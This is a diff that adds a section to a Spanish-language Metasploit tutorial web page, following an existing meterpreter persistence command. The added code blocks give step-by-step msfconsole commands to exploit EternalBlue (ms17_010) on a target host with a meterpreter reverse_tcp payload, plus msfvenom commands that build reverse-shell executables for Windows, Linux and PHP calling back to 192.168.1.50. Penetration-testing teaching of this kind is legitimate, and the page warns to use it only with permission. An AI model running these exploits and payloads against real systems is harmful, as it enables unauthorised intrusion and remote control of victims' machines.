@@ -243,6 +243,47 @@ meterpreter > persist -X -i 30 -p 443 -r 192.168.1.50</code></pre>
                 <strong>Importante:</strong> Solo usar estas técnicas en sistemas con permiso explícito.
             </div>
         </section>
+
+        <!-- Contenido Técnico Destacado -->
+        <section class="section">
+            <h2><i class="fas fa-star"></i> Contenido Técnico Destacado</h2>
+
+            <h3>1. Alias útiles para Metasploit</h3>
+            <div class="code-block">
+                <pre><code class="language-bash"># Alias recomendados para agilizar el uso de Metasploit
+alias msf='msfconsole'
+alias msfv='msfvenom'
+alias msfupdate='msfupdate'
+                </code></pre>
+            </div>
+
+            <h3>2. Comandos rápidos de msfconsole</h3>
+            <div class="code-block">
+                <pre><code class="language-bash"># Buscar exploits y módulos
+msf6 > search nombre_vulnerabilidad
+
+# Seleccionar y configurar un exploit
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS 192.168.1.100
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set LHOST 192.168.1.50
+msf6 exploit > exploit
+                </code></pre>
+            </div>
+
+            <h3>3. Generar payloads personalizados</h3>
+            <div class="code-block">
+                <pre><code class="language-bash"># Windows
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+# Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+
+# Web (PHP)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+                </code></pre>
+            </div>
+        </section>
     </main>
 
     <!-- Footer -->
